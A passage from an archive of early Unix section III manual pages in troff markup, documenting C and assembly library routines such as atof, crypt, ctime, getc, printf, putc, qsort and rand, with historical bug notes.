to get more core from the system when there is no
suitable space already free.
.sh DIAGNOSTICS
Returns \*-1 if there is no available core.
.sh BUGS
Allocated memory contains garbage
instead of being cleared.
-- /usr/man/man3/atan.3 mode=0100664 uid=3 gid=3 atime=170022257 mtime=173059744 --
.th ATAN III 4/30/73
.sh NAME
atan, atan2 \*- arc tangent function
.sh SYNOPSIS
.ft B
jsr    pc,atan\fR[\fB2\fR]\fB
.s3
.br
double atan(x)
.br
double x;
.br
.s3
double atan2(x, y)
.br
double x, y;
.ft R
.sh DESCRIPTION
The
\fIatan\fR entry returns the arc tangent
of fr0 in fr0;
from C, the arc tangent of \fIx\fR is returned.
The range is \*-\*p/2 to \*p/2.
The \fIatan2\fR entry returns the arc tangent
of fr0/fr1 in fr0;
from C, the arc tangent of
\fIx/y\fR is returned.
The range is \*-\*p to \(*p.
.sh DIAGNOSTIC
There is no error return.
.sh BUGS
-- /usr/man/man3/atof.3 mode=0100664 uid=3 gid=3 atime=170022258 mtime=173059744 --
.th ATOF III 4/30/73
.sh NAME
atof \*- convert ASCII to floating
.sh SYNOPSIS
.ft B
double atof(nptr)
.br
char *nptr;
.br
.ft R
.sh DESCRIPTION
.it Atof
converts a string to a floating
number.
.it Nptr
should point to a string containing the number;
the first unrecognized character ends the number.
.s3
The only numbers recognized are:  an optional minus
sign followed by a string of digits optionally containing
one decimal point, then followed optionally by the
letter \fBe\fR followed by a signed integer.
.sh DIAGNOSTICS
There are none; overflow results in a very large
number and garbage characters terminate the scan.
.sh BUGS
The
routine should accept initial \fB+\fR, initial blanks, and \fBE\fR for \fBe\fR.
Overflow should be signalled.
-- /usr/man/man3/atoi.3 mode=0100664 uid=3 gid=3 atime=170022259 mtime=173059744 --
.th ATOI III 2/8/75
.sh NAME
atoi \*- convert ASCII to integer
.sh SYNOPSIS
.ft B
atoi(nptr)
.br
char *nptr;
.ft R
.sh DESCRIPTION
.it Atoi
converts the string pointed to by
.it nptr
to an integer.
The string can contain leading blanks or tabs,
an optional `\-', and then an unbroken string of digits.
Conversion stops at the first non-digit.
.sh "SEE ALSO"
atof (III)
.sh BUGS
There is no provision for overflow.
-- /usr/man/man3/crypt.3 mode=0100664 uid=3 gid=3 atime=170022259 mtime=173059744 --
.th CRYPT III 4/30/73
.sh NAME
crypt \*- password encoding
.sh SYNOPSIS
.ft B
mov	$key,r0
.br
jsr	pc,crypt
.s3
char *crypt(key)
.br
char *key;
.ft R
.sh DESCRIPTION
On entry, r0 points to a string of
characters terminated by an ASCII NUL.
The routine
performs an operation on the key which is difficult to invert
(i.e. encrypts it) and leaves the resulting eight bytes
of ASCII alphanumerics in a global cell called ``word''.
.s3
From C, the
.it key
argument is a string
and the value returned is a pointer to the eight-character
result.
.s3
This routine is used to encrypt all passwords.
.sh "SEE ALSO"
passwd(I), passwd(V), login(I)
.sh BUGS
Short or otherwise simple passwords can be decrypted
easily by exhaustive search.
Six characters of gibberish is reasonably safe.
-- /usr/man/man3/ctime.3 mode=0100664 uid=3 gid=3 atime=170022260 mtime=173059744 --
.th CTIME III 10/15/73
.sh NAME
ctime, localtime, gmtime  \*-  convert date and time to ASCII
.sh SYNOPSIS
.ft B
char *ctime(tvec)
.br
int tvec[2];
.s3
.ft R
[from Fortran]
.br
.ft B
double precision ctime
.br
.li
... = ctime(dummy)
.s3
int *localtime(tvec)
.br
int tvec[2];
.s3
int *gmtime(tvec)
.br
int tvec[2];
.br
.ft R
.sh DESCRIPTION
.it Ctime
converts a time in the vector
.it tvec
such as returned by time (II)
into ASCII
and returns a pointer to a
character string
in the form
.s3
    Sun Sep 16 01:03:52 1973\\n\\0
.s3
All the fields have constant width.
.s3
The
.it localtime
and
.it gmtime
entries return pointers to integer vectors containing
the broken-down time.
.it Localtime
corrects for the time zone and possible daylight savings time;
.it gmtime
converts directly to GMT, which is the time UNIX uses.
The value is a pointer
to an array whose components are
.s3
.lp +5 5
0	seconds
.lp +5 5
1	minutes
.lp +5 5
2	hours
.lp +5 5
3	day of the month (1-31)
.lp +5 5
4	month (0-11)
.lp +5 5
5	year \*- 1900
.lp +5 5
6	day of the week (Sunday = 0)
.lp +5 5
7	day of the year (0-365)
.lp +5 5
8	Daylight Saving Time flag if non-zero
.i0
.s3
The external variable
.it timezone
contains the difference, in seconds, between GMT and local
standard time (in EST, is 5*60*60);
the external variable
.it daylight
is non-zero iff the standard U.S.A. Daylight
Savings Time conversion should be applied.
The program knows about the peculiarities
of this conversion in 1974 and 1975;
if necessary,
a table for these years can be extended.
.s3
A routine named
.it ctime
is also available from Fortran.
Actually it more resembles the
.it time
(II) system entry in that it returns the number of seconds
since the epoch
0000 GMT Jan. 1, 1970
(as a floating-point number).
.sh "SEE ALSO"
time(II)
.sh BUGS
-- /usr/man/man3/ecvt.3 mode=0100664 uid=3 gid=3 atime=170022261 mtime=173059744 --
.th ECVT III 4/30/73
.sh NAME
ecvt, fcvt \*- output conversion
.sh SYNOPSIS
.ft B
jsr	pc,ecvt
.s3
jsr	pc,fcvt
.s3
char *ecvt(value, ndigit, decpt, sign)
.br
double value;
.br
int ndigit, *decpt, *sign;
.s3
char *fcvt(value, ndigit, decpt, sign)
.br
.li
...
.ft R
.sh DESCRIPTION
.it Ecvt
is called with a floating point number in fr0.
.s3
On exit, the number has been converted into a
string of ascii digits in a buffer pointed to by r0.
The number of digits produced is controlled
by a global variable \fI\*_ndigits\fR.
.s3
Moreover, the position of the decimal point is
contained in r2: r2=0 means the d.p. is at the
left hand end of the string of digits;
r2>0 means the d.p. is within or to the right
of the string.
.s3
The sign of the number is indicated by r1 (0 for +; 1 for \*-).
.s3
The low order digit has suffered decimal rounding
(i. e. may have been carried into).
.s3
From C,
the
.it value
is converted and a pointer to a null-terminated
string of \fIndigit\fR digits is returned.
The position of the decimal point is stored indirectly
through \fIdecpt\fR (negative means to the left of the
returned digits).
If the sign of the result is negative,
the word pointed to by \fIsign\fR is non-zero, otherwise
it is zero.
.s3
\fIFcvt\fR is identical to \fIecvt\fR, except that the correct digit
been rounded for F-style output of the number
of digits specified by \fI\(*_ndigits\fR.
.sh "SEE ALSO"
printf (III)
.sh BUGS
-- /usr/man/man3/end.3 mode=0100664 uid=3 gid=3 atime=170022262 mtime=173059744 --
.th END III 4/28/75
.sh NAME
end, etext, edata \*- last locations in program
.sh SYNOPSIS
.ft B
.nf
extern	end;
extern	etext;
extern	edata;
.ft R
.fi
.sh DESCRIPTION
These names refer neither to routines
nor to locations with interesting contents.
Instead, their addresses coincide with the first
address above the program text region
.it (etext),
above the initialized data region
.it (edata),
or uninitialized data region
.it (end).
The last is the same as the program break.
Values are given to these symbols
by the link editor
.it ld
(I)
when, and only when, they are referred to but not defined
in the set of programs loaded.
.s3
The usage of these symbols is rather specialized, but one plausible
possibility is
.s3
.nf
	extern end;
	...
	... = brk(&end+...);
.fi
.s3
(see
.it break
(II)).
The problem with this is that it ignores any other
subroutines which may want to extend core for their purposes;
these include
.it sbrk
(see
.it break
(II)),
.it alloc
(III),
and also secret subroutines invoked by the profile
(\-p) option of 
.it cc.
Of course it was for the benefit of such systems
that the symbols were invented,
and user programs, unless they are in firm control
of their environment,
are wise not to refer to
the absolute symbols directly.
.s3
One technique sometimes useful
is to call
.it sbrk(0),
which returns the value of the current program break,
instead of referring to
.it &end,
which yields the program break at the instant execution started.
.s3
These symbols are accessible from assembly
language
if it is remembered that they should be prefixed by
`\*_'
.sh "SEE ALSO"
break (II), alloc (III)
.sh BUGS
-- /usr/man/man3/exp.3 mode=0100664 uid=3 gid=3 atime=170022263 mtime=173059745 --
.th EXP III 4/30/73
.sh NAME
exp \*- exponential function
.sh SYNOPSIS
.ft B
jsr	pc,exp
.s3
double exp(x)
.br
double x;
.ft R
.sh DESCRIPTION
The
exponential of fr0 is returned in fr0.
From C, the exponential of \fIx\fR is returned.
.sh DIAGNOSTICS
If
the result is not representable, the
c-bit is set
and the largest positive number is returned.
From C, no diagnostic is available.
.s3
Zero is returned if the result would underflow.
.sh BUGS
-- /usr/man/man3/floor.3 mode=0100664 uid=3 gid=3 atime=170022263 mtime=173059745 --
.th FLOOR III 5/15/74
.sh NAME
floor, ceil \*- floor and ceiling functions
.sh SYNOPSIS
.br
.ft B
double floor(x)
.br
double x;
.s3
double ceil(x)
.br
double x;
.ft R
.sh DESCRIPTION
The floor function returns the
largest integer (as a double precision number)
not greater than \fBx\fR.
.s3
The ceil function returns the
smallest integer
not less than \fBx\fR.
.sh BUGS
-- /usr/man/man3/fmod.3 mode=0100664 uid=3 gid=3 atime=170022264 mtime=173059745 --
.th FMOD III 2/13/75
.sh NAME
fmod \*- floating modulo function
.sh SYNOPSIS
.ft B
.nf
double fmod(x, y)
double x, y;
.ft R
.fi
.sh DESCRIPTION
.if t .ds L \(<=
.if n .ds L <_
.it Fmod
returns the number
.it f
such that
.it "x = iy + f,"
.it i
is an integer,
and
0 \*L
.it f
<
.it y.
.sh BUGS
-- /usr/man/man3/fptrap.3 mode=0100664 uid=3 gid=3 atime=170022264 mtime=173059745 --
.th FPTRAP III 11/18/73
.sh NAME
fptrap \*- floating point interpreter
.sh SYNOPSIS
.ft B
sys	signal; 4; fptrap
.ft R
.sh DESCRIPTION
.it Fptrap
is a simulator of the
11/45 FP11-B floating point unit.
It works by intercepting illegal instruction
traps
and decoding and executing the floating point operation codes.
.sh FILES
In systems with real floating point,
there is a fake routine in /lib/liba.a with this name;
when simulation is desired,
the real version should be put in liba.a
.sh DIAGNOSTICS
A break point trap is given when a real
illegal instruction trap occurs.
.sh "SEE ALSO"
signal (II),
cc (I) (`\-f' option)
.sh BUGS
Rounding mode is not interpreted.
It's slow.
-- /usr/man/man3/gamma.3 mode=0100664 uid=3 gid=3 atime=170022265 mtime=173059745 --
.th GAMMA III 5/15/74
.sh NAME
gamma \*- log gamma function
.sh SYNOPSIS
.br
.ft B
jsr	pc,gamma
.s3
double gamma(x)
.br
double x;
.ft R
.sh DESCRIPTION
If \fIx\fR is passed (in fr0)
.it gamma
returns
ln |\*|\*G(\*|\fIx\fR\*|)\*|| (in fr0).
The sign of
\*G(\*|\fIx\fR\*|)
is returned in the external integer
.it signgam.
The following C program might be
used to calculate
\*G:
.s3
	y = gamma(x);
.br
	if (y > 88.)
.br
		error( );
.br
	y = exp(y);
.br
	if(signgam)
.br
		y = \*-y;
.sh DIAGNOSTICS
The c-bit is
set on negative integral arguments and the
maximum value is returned.
There is no error return for C programs.
.sh BUGS
No error return from C.
-- /usr/man/man3/getarg.3 mode=0100664 uid=3 gid=3 atime=170022265 mtime=173059745 --
.th GETARG III 11/24/73
.sh NAME
getarg, iargc \*- get command arguments from Fortran
.sh SYNOPSIS
.ft B
call getarg ( i, iarray \fR[ \fB, isize \fR]\fB )
.s3
.li
... = iargc(dummy)
.ft R
.sh DESCRIPTION
The
.it getarg
entry fills in
.it iarray
(which is considered to be
.it integer)
with the Hollerith string representing the
.it i
th
argument to the command
in which it it is called.
If no
.it isize
argument is specified,
at least one blank is placed after the argument,
and the last word affected is blank padded.
The user should make sure that the array is big enough.
.s3
If the
.it isize
argument is given,
the argument will be followed by blanks
to fill up
.it isize
words, but even if the argument is long no more than
that many words will be filled in.
.s3
The blank-padded array is suitable for use as an
argument to setfil (III).
.s3
The
.it iargc
entry returns the number of arguments to the command,
counting the first (file-name) argument.
.sh "SEE ALSO"
exec (II),
setfil (III)
.sh BUGS
-- /usr/man/man3/getc.3 mode=0100664 uid=3 gid=3 atime=170022266 mtime=173059745 --
.th GETC III 4/30/72
.sh NAME
getc, getw, fopen  \*-  buffered input
.sh SYNOPSIS
.ft B
mov	$filename,r0
.br
jsr	r5,fopen; iobuf
.s3
fopen(filename, iobuf)
.br
char *filename;
.br
struct buf *iobuf;
.s3
jsr	r5,getc; iobuf
.br
.ft R
(character in r0)
.s3
.ft B
getc(iobuf)
.br
struct buf *iobuf;
.s3
jsr	r5,getw; iobuf
.br
.ft R
(word in r0)
.s3
.ft B
getw(iobuf)
.br
struct buf *iobuf;
.ft R
.sh DESCRIPTION
These routines provide a buffered input
facility.
.it Iobuf
is the address of a 518(10) byte buffer area whose
contents are maintained by these routines.
Its structure is
.s3
.nf
.ft B
	struct buf {
		int fildes;	/* File descriptor */
		int nleft;	/* Chars left in buffer */
		char *nextp;	/* Ptr to next character */
		char buff[512];	/* The buffer */
	};
.ft R
.s3
.fi
.it Fopen
may be called initially to open the file.  On return,
the error bit (c-bit) is set if the open failed.
If \fIfopen\fR is never called, \fIget\fR will
read from the standard
input file.
From C, the value is negative if the open failed.
.s3
.it Getc
returns the next byte from the file in r0.
The error bit is set on end of file or a read error.
From C, the character is returned as an integer, without sign extension;
it is \*-1 on end-of-file or error.
.s3
\fIGetw\fR returns the next word in r0.
.it Getc
and
\fIgetw\fR
may be used alternately; there are no odd/even
problems.
\fIGetw\fR is may be called from C;
\*-1 is returned on end-of-file or error,
but of course
is also a legitimate value.
.s3
.it Iobuf
must be provided by the user; it must be on a word boundary.
.s3
To reuse the same buffer for another file, it is sufficient
to close the original file and call \fIfopen\fR again.
.sh "SEE ALSO"
open (II), read (II), getchar (III), putc (III)
.sh DIAGNOSTICS
c-bit set on EOF or error;
from C, negative return indicates error or EOF.
Moreover,
.it errno
is set by this routine just as it is for a system call
(see introduction (II)).
.sh BUGS
-- /usr/man/man3/getchar.3 mode=0100664 uid=3 gid=3 atime=170022267 mtime=173059745 --
.th GETCHAR III 4/7/73
.sh NAME
getchar \*- read character
.sh SYNOPSIS
.ft B
getchar( )
.br
.ft R
.sh DESCRIPTION
.it Getchar
provides the simplest means of reading characters from
the standard input for C programs.
It returns successive characters until end-of-file,
when it returns ``\\0''.
.s3
Associated with this routine is an external variable
called \fIfin\fR, which is a structure containing
a buffer such as described under \fIgetc\fR (III).
.s3
Generally speaking,
.it getchar
should be used only for the simplest applications;
.it getc
is better when there are multiple input files.
.sh "SEE ALSO"
getc (III)
.sh DIAGNOSTICS
Null character returned on EOF or error.
.sh BUGS
\*-1 should be
returned on EOF; null is a legitimate character.
-- /usr/man/man3/getpw.3 mode=0100664 uid=3 gid=3 atime=170022268 mtime=173059745 --
.th GETPW III 4/7/73
.sh NAME
getpw \*- get name from UID
.sh SYNOPSIS
.ft B
getpw(uid, buf)
.br
char *buf;
.ft R
.sh DESCRIPTION
.it Getpw
searches the password file for
the (numerical)
\fIuid\fR, and fills in \fIbuf\fR
with the corresponding line;
it returns non-zero if \fIuid\fR could not
be found.
The line is null-terminated.
.sh FILES
/etc/passwd
.sh "SEE ALSO"
passwd (V)
.sh DIAGNOSTICS
non-zero
return on error.
.sh BUGS
-- /usr/man/man3/hmul.3 mode=0100664 uid=3 gid=3 atime=170022268 mtime=173059745 --
.th HMUL III 4/7/73
.sh NAME
hmul \*- high-order product
.sh SYNOPSIS
.ft B
hmul(x, y)
.ft R
.sh DESCRIPTION
.it Hmul
returns the high-order 16 bits of the product of
.bd x
and
.bd y.
(The binary multiplication operator generates
the low-order 16 bits of a product.)
.sh BUGS
-- /usr/man/man3/ierror.3 mode=0100664 uid=3 gid=3 atime=170022269 mtime=173059745 --
.th IERROR III 10/29/73
.sh NAME
ierror \*- catch Fortran errors
.sh SYNOPSIS
.ft B
if ( ierror ( \fIerrno\fB ) .ne. 0 ) goto \fIlabel\fR
.sh DESCRIPTION
.it Ierror
provides a way of detecting errors during the running of a Fortran
program.
Its argument is a run-time error number
such as enumerated in
.it fc
(I).
.s3
When
.it ierror
is called,
it returns a 0 value; thus the
.bd goto
statement in the synopsis is not executed.
However, the routine stores inside itself the
call point and invocation level.
If and when the indicated error occurs,
a
.bd return
is simulated from
.it ierror
with a non-zero value;
thus the
.bd goto
(or other statement)
is executed.
It is a ghastly error to call
.it ierror
from a subroutine which
has already returned when the error occurs.
.s3
This routine is essentially tailored to
catching end-of-file situations.
Typically it is called just before the start
of the loop which reads the input file,
and the
.bd goto
jumps to a graceful termination of the program.
.s3
There is a limit of 5 on the number
of different error numbers which can be caught.
.sh "SEE ALSO"
fc (I)
.sh BUGS
There is no way to ignore errors.
-- /usr/man/man3/ldiv.3 mode=0100664 uid=3 gid=3 atime=170022270 mtime=173059745 --
.th LDIV III 5/7/73
.sh NAME
ldiv, lrem \*- long division
.sh SYNOPSIS
.ft B
ldiv(hidividend, lodividend, divisor)
.s3
lrem(hidividend, lodividend, divisor)
.ft R
.sh DESCRIPTION
The
concatenation of the signed
16-bit
.it hidividend
and the unsigned 16-bit
.it lodividend
is divided by
\fIdivisor\fR.
The 16-bit signed quotient is returned by
.it ldiv
and the 16-bit signed remainder is returned by
.it lrem.
Divide check and erroneous results
will occur
unless the magnitude of the
divisor is greater than that of the high-order
dividend.
.s3
An integer division of an unsigned
dividend by a signed divisor may
be accomplished by
.s3
	quo = ldiv(0, dividend, divisor);
.s3
and similarly for the remainder operation.
.s3
Often both the quotient and the remainder are wanted.
Therefore
.it ldiv
leaves a remainder in the external cell
.it ldivr.
.sh BUGS
No divide check check.
-- /usr/man/man3/locv.3 mode=0100664 uid=3 gid=3 atime=170022271 mtime=173059745 --
.th LOCV III 3/9/74
.sh NAME
locv \*- long output conversion
.sh SYNOPSIS
.nf
.ft B
char *locv(hi, lo)
int hi, lo;
.fi
.ft R
.sh DESCRIPTION
.it Locv
converts a signed double-precision integer,
whose parts are passed as arguments,
to the equivalent ASCII character string
and returns a pointer to that string.
.sh BUGS
Since
.it locv
returns a pointer to a static buffer containing the
converted result, it cannot be used twice
in the same expression;
the second result overwrites the first.
-- /usr/man/man3/log.3 mode=0100664 uid=3 gid=3 atime=170022273 mtime=173059745 --
.th LOG III 4/30/72
.sh NAME
log \*- natural logarithm
.sh SYNOPSIS
.ft B
jsr	pc,log
.s3
double log(x)
.br
double x;
.ft R
.sh DESCRIPTION
The
natural logarithm of fr0 is returned in fr0.
From C, the natural logarithm of \fBx\fR is returned.
.sh DIAGNOSTICS
The error bit (c-bit)
is set if the input argument is less than or
equal to zero and the result is a
negative number very large in magnitude.
From C, there is no error indication.
.sh BUGS
-- /usr/man/man3/monitor.3 mode=0100664 uid=3 gid=3 atime=170022273 mtime=173059746 --
.th MONITOR III 2/11/74
.sh NAME
monitor \*- prepare execution profile
.sh SYNOPSIS
.ft B
monitor(lowpc, highpc, buffer, bufsize)
.br
int lowpc( ), highpc( ), buffer[ ], bufsize;
.ft R
.sh DESCRIPTION
.it Monitor
is an interface to the system's profile entry (II).
.it Lowpc
and
.it highpc
are the names of two functions;
.it buffer
is the address of a (user supplied)
array of
.it bufsize
integers.
.it Monitor
arranges for the system to sample the user's
program counter periodically
and record the execution histogram in
the buffer.
The lowest address sampled
is that of
.it lowpc
and the highest is
just below
.it highpc.
For the results to be significant,
especially where there are small, heavily
used routines,
it is suggested that the buffer be no more
than a few times smaller than the range
of locations sampled.
.s3
To profile the entire program,
it is sufficient to use
.s3
	extern etext;
.br
	...
.br
	monitor(2, &etext, buf, bufsize);
.s3
.it Etext
is a loader-defined symbol which lies just above all the
program text.
.s3
To stop execution monitoring and write the results
on the file
.it mon.out,
use
.s3
	monitor(0);
.s3
Then, when the program exits, prof (I) can be used
to examine the results.
.s3
It is seldom necessary to call this routine
directly; the
.bd \*-p
option of
.it cc
is simpler if one is satisfied with
its default profile range and resolution.
.sh FILES
mon.out
.sh "SEE ALSO"
prof (I), profil (II), cc (I)
-- /usr/man/man3/nargs.3 mode=0100664 uid=3 gid=3 atime=170022274 mtime=173059746 --
.th NARGS III 5/10/73
.sh NAME
nargs \*- argument count
.sh SYNOPSIS
.bd "nargs( )"
.sh DESCRIPTION
.it Nargs
returns the number of actual parameters
supplied by the caller of the routine which calls 
\fInargs\fR.
.s3
The argument count is accurate only when
none of the actual parameters is
.it float
or
\fIdouble\fR.
Such parameters count as four arguments instead of one.
.sh BUGS
As indicated.
Also, this routine does not work (and cannot be made
to work) in programs with separated I and D space.
Altogether it is best to avoid using this
routine and depend, for example,
on passing an explicit argument count.
-- /usr/man/man3/nlist.3 mode=0100664 uid=3 gid=3 atime=170022275 mtime=173059746 --
.th NLIST III 6/12/72
.sh NAME
nlist \*- get entries from name list
.sh SYNOPSIS
.ft B
.nf
.i0
nlist(filename, nl)
char *filename;
.dt
struct {
	char	name[8];
	int	type;
	int	value;
} nl[ ];
.fi
.ft R
.sh DESCRIPTION
.it Nlist
examines the name list in
the given executable output file
and selectively extracts a
list of values.
The name list consists of
a list of 8-character names (null padded)
each followed by two words.
The list is terminated with a null name.
Each name is looked up in the name list of
the file.
If the name is found, the type and value of the
name are placed in the two words following
the name.
If the name is not found, the type entry is set to \*-1.
.s3
This subroutine is useful for
examining the system name list kept in
the file
\fB/unix\fR.
In this way programs can obtain system addresses
that are up to date.
.sh "SEE ALSO"
a.out (V)
.sh DIAGNOSTICS
All
type entries are set to \*-1 if the file cannot be found
or if it is not a valid namelist.
.sh BUGS
-- /usr/man/man3/perror.3 mode=0100664 uid=3 gid=3 atime=170022276 mtime=173059746 --
.th PERROR III 11/5/73
.sh NAME
perror, sys\*_errlist, sys\*_nerr, errno \*- system error messages
.sh SYNOPSIS
.ft B
perror(s)
.br
char *s;
.s3
int sys\*_nerr;
.br
char *sys\*_errlist[];
.s3
int errno;
.ft R
.br
.sh DESCRIPTION
.it Perror
produces a short error message
describing the last error encountered during a call
to the system from a C program.
First the argument string
.it s
is printed, then a colon, then the message and a new-line.
Most usefully, the argument string is the name
of the program which incurred the error.
The error number is taken from the external variable
.it errno,
which is set when errors occur but not cleared when
non-erroneous calls are made.
.s3
To simplify variant formatting
of messages, the vector of message strings
.it sys\*_errlist
is provided;
.it errno
can be used as an index in this table to get the
message string without the newline.
.it Sys\*_nerr
is the largest message number provided for in the table;
it should be checked because new
error codes may be added to the system before
they are added to the table.
.sh "SEE ALSO"
Introduction to System Calls
.sh BUGS
-- /usr/man/man3/pow.3 mode=0100664 uid=3 gid=3 atime=170022276 mtime=173059746 --
.tr |
.th POW III 4/30/73
.sh NAME
pow \*- floating exponentiation
.sh SYNOPSIS
.ft B
movf	x,fr0
.br
movf	y,fr1
.br
jsr	pc,pow
.s3
.nf
double pow(x,y)
double x, y;
.fi
.s3
.ft R
.sh DESCRIPTION
.it Pow
returns
the value of
\fIx\u\s8y\s10\d\fR
(in fr0).
.it "Pow(0.0,|y)"
is 0 for any
.it y.
.it "Pow(\*-x,|y)"
returns a result only if
.it y
is an integer.
.sh "SEE ALSO"
exp (III), log (III)
.sh DIAGNOSTICS
The
carry bit is set on return in case of overflow,
.it pow(0.0,|0.0),
or
.it pow(\*-x,|y)
for non-integral
.it y.
From C there is no diagnostic.
.sh BUGS
-- /usr/man/man3/printf.3 mode=0100664 uid=3 gid=3 atime=170022277 mtime=173059746 --
.th PRINTF III 9/17/73
.sh NAME
printf \*- formatted print
.sh SYNOPSIS
.ft B
printf(format, arg\s6\d1\u\s10, ...);
.br
char *format;
.ft R
.sh DESCRIPTION
.it Printf
converts, formats, and prints its arguments after the first
under control of the first argument.
The first argument is a character string
which contains
two types of objects:
plain characters, which are simply copied to the
output stream,
and conversion specifications,
each of which causes conversion and printing
of the next successive argument to
.it printf.
.s3
Each conversion specification is introduced by
the character \fB%\fR.
Following the \fB%\fR, there may be
.s3
.lp +6 2
\*-	an optional minus sign ``\*-'' which specifies
.it "left adjustment"
of the converted argument
in the
indicated field;
.s3
.lp +6 2
\*-	an optional digit string specifying a
.it "field width;"
if the converted argument has fewer characters
than the field width
it will be blank-padded on the left (or right,
if the left-adjustment indicator has been
given) to make up the field width;
.s3
.lp +6 2
\*-	an optional period ``\fB.\fR'' which serves to
separate the field width from the
next digit string;
.s3
.lp +6 2
\*-	an optional digit string
.it "(precision)"
which specifies
the number of digits to appear after the
decimal point, for e- and f-conversion,
or the maximum number of characters
to be printed from a string;
.s3
.lp +6 2
\*-	a character which indicates the type of
conversion to be applied.
.s3
.i0
The conversion characters
and their meanings are
.s3
.lp +6 3
d
.lp +6 3
o
.lp +6 3
x	The integer argument is converted to decimal, octal, or
hexadecimal notation respectively.
.s3
.lp +6 3
f	The argument is converted to decimal notation
in the style ``[\fB\*-\fR]ddd.ddd''
where the number of d's after the decimal point
is equal to the precision specification
for the argument.
If the precision
is missing,
6 digits are given;
if the precision is explicitly 0, no digits and
no decimal point are printed.
The argument should be
.it float
or
.it double.
.s3
.lp +6 3
e	The argument is converted in the style
``[\fB\*-\fR]d\fB.\fRddd\fBe\fR\(+-dd''
where there is one digit before the decimal point and
the number after is equal to the
precision specification for the argument;
when the precision is missing,
6 digits are produced.
The argument should be a
.it float
or
.it double
quantity.
.s3
.lp +6 3
c	The argument character is printed.
.s3
.lp +6 3
s	The argument is taken to be a string (character pointer)
and characters from the string are printed until
a null character or until
the number of characters indicated by the precision
specification is reached;
however if the precision is 0 or missing
all characters up to a null are printed.
.s3
.lp +6 3
l	The argument is taken to be an unsigned
integer which is converted to decimal
and printed (the result will be in the
range 0 to 65535).
.s3
.i0
If no recognizable character appears after the \fB%\fR,
that character is printed;
thus \fb%\fR may be printed by use of the
string \fB%%\fR.
In no case does a non-existent or small field width
cause truncation of a field;
padding takes place only if the specified field
width exceeds the actual width.
Characters generated by
.it printf
are printed by calling
.it putchar.
.sh "SEE ALSO"
putchar (III)
.sh BUGS
Very wide fields (>128 characters) fail.
-- /usr/man/man3/putc.3 mode=0100664 uid=3 gid=3 atime=170022278 mtime=173059746 --
.th PUTC III 6/12/72
.sh NAME
putc, putw, fcreat, fflush  \*-  buffered output
.sh SYNOPSIS
.ft B
.nf
mov	$filename,r0
jsr	r5,fcreat; iobuf
.s3
fcreat(file, iobuf)
char *file;
struct buf *iobuf;
.s3
.ft R
(get byte in r0)
.ft B
jsr	r5,putc; iobuf
.s3
putc(c, iobuf)
int c;
struct buf *iobuf;
.s3
.ft R
(get word in r0)
.ft B
jsr	r5,putw; iobuf
.s3
putw(w, iobuf);
.br
int w;
.br
struct buf *iobuf;
.s3
jsr	r5,flush; iobuf
.s3
fflush(iobuf)
struct buf *iobuf;
.fi
.ft R
.sh DESCRIPTION
.it Fcreat
creates
the given file (mode 666) and sets up the buffer
.it iobuf
(size 518 bytes);
.it putc
and
.it putw
write a byte or word respectively
onto the file;
.it flush
forces the contents of the buffer to be written, but
does not close the file.
The structure of the buffer is:
.nf
.ft B
.nf
struct buf {
	int fildes;	/* File descriptor */
	int nunused;	/* Remaining slots */
	char *xfree;	/* Ptr to next free slot */
	char buff[512];	/* The buffer */
};
.ft R
.s3
.fi
Before terminating, a program should call
.it flush
to force out the last of the output
.it (fflush
from C).
.s3
The user must supply
.it iobuf,
which should begin on a word boundary.
.s3
To write a new file using the same buffer, it
suffices to call
.it [f]flush,
close the file,
and
call
.it fcreat
again.
.sh "SEE ALSO"
creat (II), write (II), getc (III)
.sh DIAGNOSTICS
.it Fcreat
sets the error bit (c-bit) if the 
file creation failed (from C, returns \*-1).
.it Putc
and
.it putw
return their character (word) argument.
In all calls 
.it errno
is set appropriately to 0 or to
a system error number.
See introduction (II).
.sh BUGS
-- /usr/man/man3/putchar.3 mode=0100664 uid=3 gid=3 atime=170022279 mtime=173059746 --
.th PUTCHAR III 5/10/73
.sh NAME
putchar, flush \*- write character
.sh SYNOPSIS
.ft B
putchar(ch)
.s3
flush( )
.ft R
.sh DESCRIPTION
.it Putchar
writes out its argument and returns it unchanged.
Only the low-order byte is written, and only if it is non-null.
Unless other arrangements have been made,
.it putchar
writes in
unbuffered fashion on the standard output file.
.s3
Associated with this routine is an external variable
.it fout
which has the
structure of a buffer discussed under putc (III).
If the file descriptor part of this structure (first word)
is greater than 2, output via
.it putchar
is buffered.
To achieve buffered output one may say, for example,
.s3
.nf
	fout = dup(1);		or
	fout = creat(...);
.s3
.fi
In such a case
.it flush
must be called
before the program terminates in order to flush out
the buffered output.
.it Flush
may be called at any time.
.sh "SEE ALSO"
putc (III)
.sh BUGS
The
.it fout
notion is kludgy.
-- /usr/man/man3/qsort.3 mode=0100664 uid=3 gid=3 atime=170022280 mtime=173059746 --
.th QSORT III 2/8/75
.sh NAME
qsort \*- quicker sort
.sh SYNOPSIS
.nf
.ft B
qsort(base, nel, width, compar)
char *base;
int (*compar)( );
.fi
.ft R
.sh DESCRIPTION
.it Qsort
is an implementation
of the quicker-sort algorithm.
The first argument is a pointer to the base of the data;
the second is the number of elements;
the third is the width of an element
in bytes;
the last is the name of the comparison routine.
It is called with two arguments which are pointers
to the elements being compared.
The routine must return
an integer less than, equal to, or greater than 0
according as the first argument is to be considered
less than, equal to, or greater than the second.
.sh "SEE ALSO"
sort (I)
.sh BUGS
-- /usr/man/man3/rand.3 mode=0100664 uid=3 gid=3 atime=170022281 mtime=173059746 --
.th RAND III 1/15/73
.sh NAME
rand, srand \*- random number generator
.sh SYNOPSIS
(seed in r0)
.br
.ft B
jsr	pc,srand	/to initialize
.s3
jsr	pc,rand	/to get a random number
.s3
.nf
srand(seed)
int seed;
.s3
rand( )
.fi
.ft R
.s3
.sh DESCRIPTION
.it Rand
uses a multiplicative congruential
random number generator to return successive pseudo-random
numbers (in r0) in the range from 0 to 2\u\s715\s10\d\*-1.
.s3
The generator is reinitialized by calling
.it srand
with 1 as argument (in r0).
It can be set to a random starting point by calling
.it srand
with whatever you like as argument,
for example the low-order word
of the time.
.sh BUGS
The low-order bits are not very random.
-- /usr/man/man3/reset.3 mode=0100664 uid=3 gid=3 atime=170022281 mtime=173059747 --
.th RESET III 5/10/73
.sh NAME
reset, setexit \*- execute non-local goto
.sh SYNOPSIS
.ft B
.bd "setexit( )"
.s3
.bd "reset( )"
.ft R
.sh DESCRIPTION
These routines are useful for dealing with errors 
and interrupts encountered in
a low-level subroutine of a program.
.s3
.it Setexit
saves its stack environment in a static place for
later use by
.it reset.
.s3
.it Reset
restores the environment saved by the last call of
.it setexit.
It then returns in such a way that execution
